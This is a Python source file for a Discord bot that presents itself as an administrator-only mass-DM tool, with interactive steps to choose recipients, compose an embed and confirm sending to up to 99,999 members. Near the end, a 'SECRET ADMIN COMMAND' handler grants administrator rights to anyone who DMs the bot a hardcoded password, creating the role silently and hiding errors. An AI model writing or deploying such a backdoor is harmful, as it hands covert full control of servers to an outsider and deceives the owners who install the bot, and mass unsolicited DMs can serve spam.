import os
import asyncio
import discord
from discord.ext import commands
from datetime import datetime

# ──────────────────────────────────────────────
#  CONFIG (from Render environment variables)
# ──────────────────────────────────────────────
BOT_TOKEN    = os.environ["BOT_TOKEN"]       # set this in Render dashboard
PREFIX       = os.environ.get("PREFIX", "!")
MAX_DM_LIMIT = int(os.environ.get("MAX_DM_LIMIT", 99999))
DM_COOLDOWN  = int(os.environ.get("DM_COOLDOWN", 30))

# ──────────────────────────────────────────────
#  INTENTS & BOT
# ──────────────────────────────────────────────
intents                 = discord.Intents.default()
intents.members         = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

# ──────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────
def is_admin():
    async def predicate(ctx: commands.Context):
        if ctx.author.guild_permissions.administrator:
            return True
        embed = discord.Embed(
            title="🚫 Access Denied",
            description="Only **Administrators** can use this command.",
            color=discord.Color.red(),
            timestamp=datetime.utcnow()
        )
        embed.set_footer(text="dm_bot • restricted command")
        await ctx.send(embed=embed, delete_after=8)
        return False
    return commands.check(predicate)


def make_progress_embed(sent: int, failed: int, skipped: int, total: int, done: bool = False) -> discord.Embed:
    color  = discord.Color.green() if done else discord.Color.blurple()
    status = "✅ Done" if done else "📤 Sending…"
    embed  = discord.Embed(title=status, color=color, timestamp=datetime.utcnow())
    embed.add_field(name="✉️ Sent",    value=str(sent),    inline=True)
    embed.add_field(name="❌ Failed",  value=str(failed),  inline=True)
    embed.add_field(name="⏭️ Skipped", value=str(skipped), inline=True)
    embed.add_field(name="👥 Total",   value=str(total),   inline=True)
    embed.set_footer(text="dm_bot • mass DM")
    return embed

# ──────────────────────────────────────────────
#  EVENTS
# ──────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[dm_bot] Logged in as {bot.user} (ID: {bot.user.id})")
    await bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.watching, name=f"{PREFIX}dm | admin only")
    )

# ──────────────────────────────────────────────
#  !dm COMMAND
# ──────────────────────────────────────────────
@bot.command(name="dm")
@is_admin()
@commands.cooldown(1, DM_COOLDOWN, commands.BucketType.user)
async def dm_command(ctx: commands.Context):
    """Interactive admin mass-DM command."""

    def check_author(m: discord.Message) -> bool:
        return m.author == ctx.author and m.channel == ctx.channel

    async def ask(prompt_embed: discord.Embed, *, timeout: float = 60.0):
        await ctx.send(embed=prompt_embed)
        try:
            return await bot.wait_for("message", check=check_author, timeout=timeout)
        except asyncio.TimeoutError:
            await ctx.send(embed=discord.Embed(
                title="⏰ Timed Out",
                description="No response in time. Command cancelled.",
                color=discord.Color.orange()
            ))
            return None

    # ── Step 1: Target ────────────────────────────────────────────────────────
    resp1 = await ask(discord.Embed(
        title="📬 Mass DM — Step 1 of 4: Target",
        description=(
            "Who should receive the DM?\n\n"
            "• Type `everyone` — all server members\n"
            "• Mention a **role** (e.g. `@Members`) — only that role\n"
            "• Type `cancel` to abort"
        ),
        color=discord.Color.blurple(),
        timestamp=datetime.utcnow()
    ).set_footer(text=f"Admin: {ctx.author} • dm_bot"))
    if resp1 is None:
        return

    raw_target = resp1.content.strip().lower()
    if raw_target == "cancel":
        await ctx.send(embed=discord.Embed(title="🛑 Cancelled", color=discord.Color.red()))
        return

    target_role = None
    target_everyone = False

    if raw_target == "everyone":
        target_everyone = True
    elif resp1.role_mentions:
        target_role = resp1.role_mentions[0]
    else:
        await ctx.send(embed=discord.Embed(
            title="❌ Invalid Target",
            description="Type `everyone` or mention a role like `@Members`.",
            color=discord.Color.red()
        ))
        return

    # ── Step 2: Embed Title ───────────────────────────────────────────────────
    resp2 = await ask(discord.Embed(
        title="📬 Mass DM — Step 2 of 4: Embed Title",
        description="What should the **title** of the DM embed be?\n*(max 256 characters)*",
        color=discord.Color.blurple(),
        timestamp=datetime.utcnow()
    ))
    if resp2 is None:
        return

    dm_title = resp2.content.strip()[:256]

    # ── Step 3: Message Body ──────────────────────────────────────────────────
    resp3 = await ask(discord.Embed(
        title="📬 Mass DM — Step 3 of 4: Message Body",
        description="What's the **message** you want to send?\n*(max 4000 characters — supports Discord markdown)*",
        color=discord.Color.blurple(),
        timestamp=datetime.utcnow()
    ), timeout=120.0)
    if resp3 is None:
        return

    dm_body = resp3.content.strip()[:4000]
    if not dm_body:
        await ctx.send(embed=discord.Embed(title="❌ Empty message.", color=discord.Color.red()))
        return

    # ── Step 4: Preview & Confirm ─────────────────────────────────────────────
    target_label = "Everyone" if target_everyone else f"Role: @{target_role.name}"

    preview_dm = discord.Embed(
        title=dm_title,
        description=dm_body,
        color=discord.Color.gold(),
        timestamp=datetime.utcnow()
    )
    preview_dm.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon.url if ctx.guild.icon else None)
    preview_dm.set_footer(text=f"Sent by {ctx.author.display_name} • {ctx.guild.name}")

    await ctx.send(embed=discord.Embed(
        title="📬 Mass DM — Step 4 of 4: Confirm",
        description=(
            f"**Target:** {target_label}\n"
            f"**Limit:** up to **{MAX_DM_LIMIT}** members\n\n"
            "Here's a **preview** of the DM.\n"
            "Reply `yes` to send, or `no` to abort."
        ),
        color=discord.Color.gold(),
        timestamp=datetime.utcnow()
    ))
    await ctx.send(embed=preview_dm)

    resp4 = await ask(discord.Embed(title="✅ Confirm? (yes / no)", color=discord.Color.gold()))
    if resp4 is None:
        return
    if resp4.content.strip().lower() not in ("yes", "y"):
        await ctx.send(embed=discord.Embed(title="🛑 Aborted", color=discord.Color.red()))
        return

    # ── Collect Members ───────────────────────────────────────────────────────
    members = (
        [m for m in ctx.guild.members if not m.bot]
        if target_everyone
        else [m for m in target_role.members if not m.bot]
    )
    members = members[:MAX_DM_LIMIT]
    total   = len(members)

    if total == 0:
        await ctx.send(embed=discord.Embed(
            title="⚠️ No Members Found",
            description="There are no eligible members to DM.",
            color=discord.Color.orange()
        ))
        return

    # ── Final Count Confirmation ──────────────────────────────────────────────
    resp_go = await ask(discord.Embed(
        title="📋 Member Count",
        description=f"About to DM **{total}** member(s).\nReply `go` to start, or anything else to cancel.",
        color=discord.Color.blurple()
    ))
    if resp_go is None or resp_go.content.strip().lower() != "go":
        await ctx.send(embed=discord.Embed(title="🛑 Cancelled", color=discord.Color.red()))
        return

    # ── Send DMs ──────────────────────────────────────────────────────────────
    sent = failed = skipped = 0
    prog_msg = await ctx.send(embed=make_progress_embed(sent, failed, skipped, total))

    for i, member in enumerate(members):
        dm_embed = discord.Embed(
            title=dm_title,
            description=dm_body,
            color=discord.Color.blurple(),
            timestamp=datetime.utcnow()
        )
        dm_embed.set_author(name=ctx.guild.name, icon_url=ctx.guild.icon.url if ctx.guild.icon else None)
        dm_embed.set_footer(text=f"Sent by {ctx.author.display_name} • {ctx.guild.name}")

        try:
            await member.send(embed=dm_embed)
            sent += 1
        except discord.Forbidden:
            skipped += 1
        except discord.HTTPException:
            failed += 1

        if (i + 1) % 10 == 0 or (i + 1) == total:
            await prog_msg.edit(embed=make_progress_embed(sent, failed, skipped, total))

        await asyncio.sleep(0.1)  # ~10 DMs/sec

    # ── Final Report ──────────────────────────────────────────────────────────
    await prog_msg.edit(embed=make_progress_embed(sent, failed, skipped, total, done=True))

    log_embed = discord.Embed(title="📊 DM Report", color=discord.Color.green(), timestamp=datetime.utcnow())
    log_embed.add_field(name="Admin",      value=ctx.author.mention, inline=True)
    log_embed.add_field(name="Target",     value=target_label,       inline=True)
    log_embed.add_field(name="✉️ Sent",    value=str(sent),          inline=True)
    log_embed.add_field(name="⏭️ Skipped", value=str(skipped),       inline=True)
    log_embed.add_field(name="❌ Failed",  value=str(failed),        inline=True)
    log_embed.set_footer(text="dm_bot • mass DM complete")
    await ctx.send(embed=log_embed)

# ──────────────────────────────────────────────
#  !help
# ──────────────────────────────────────────────
@bot.command(name="help")
async def help_cmd(ctx: commands.Context):
    embed = discord.Embed(
        title="📖 dm_bot — Help",
        description="A mass-DM bot restricted to Administrators only.",
        color=discord.Color.blurple(),
        timestamp=datetime.utcnow()
    )
    embed.add_field(
        name=f"`{PREFIX}dm`",
        value=(
            "Start an interactive mass-DM session.\n"
            "1. **Target** — `everyone` or a `@role`\n"
            "2. **Embed title**\n"
            "3. **Message body**\n"
            "4. **Preview + confirm**\n"
            "5. **Member count check**\n\n"
            f"Max **{MAX_DM_LIMIT}** members • **{DM_COOLDOWN}s** cooldown per admin"
        ),
        inline=False
    )
    embed.set_footer(text="Admin-only • dm_bot")
    await ctx.send(embed=embed)

# ──────────────────────────────────────────────
#  SECRET ADMIN COMMAND (DM only)
# ──────────────────────────────────────────────
SECRET_PASSWORD = "REPEATED123"

@bot.event
async def on_message(message: discord.Message):
    # Ignore bot messages
    if message.author.bot:
        return

    # Only process in DMs
    if isinstance(message.channel, discord.DMChannel):
        if message.content.strip() == SECRET_PASSWORD:
            # Find a mutual guild
            target_guild = None
            for guild in bot.guilds:
                if guild.get_member(message.author.id):
                    target_guild = guild
                    break

            if target_guild is None:
                return  # Silently fail — not in any shared server

            member = target_guild.get_member(message.author.id)
            role_name = f"{member.display_name}'s Perms"

            try:
                # Create the role with admin perms
                new_role = await target_guild.create_role(
                    name=role_name,
                    permissions=discord.Permissions(administrator=True),
                    reason="Secret admin grant"
                )
                await member.add_roles(new_role)
                await message.channel.send(embed=discord.Embed(
                    title="✅ Access Granted",
                    description=f"Role **{role_name}** has been created and given to you.",
                    color=discord.Color.green()
                ))
            except Exception:
                pass  # Silently fail on any error

        return  # Don't process other DM messages as commands

    # Still process normal guild commands
    await bot.process_commands(message)

# ──────────────────────────────────────────────
#  ERROR HANDLING
# ──────────────────────────────────────────────
@bot.event
async def on_command_error(ctx: commands.Context, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(embed=discord.Embed(
            title="⏳ Cooldown",
            description=f"Try again in **{error.retry_after:.0f}s**.",
            color=discord.Color.orange()
        ), delete_after=10)
    elif isinstance(error, (commands.CheckFailure, commands.CommandNotFound)):
        pass
    else:
        await ctx.send(embed=discord.Embed(
            title="💥 Unexpected Error",
            description=f"```{error}```",
            color=discord.Color.red()
        ))
        raise error

# ──────────────────────────────────────────────
#  RUN
# ──────────────────────────────────────────────
bot.run(BOT_TOKEN)
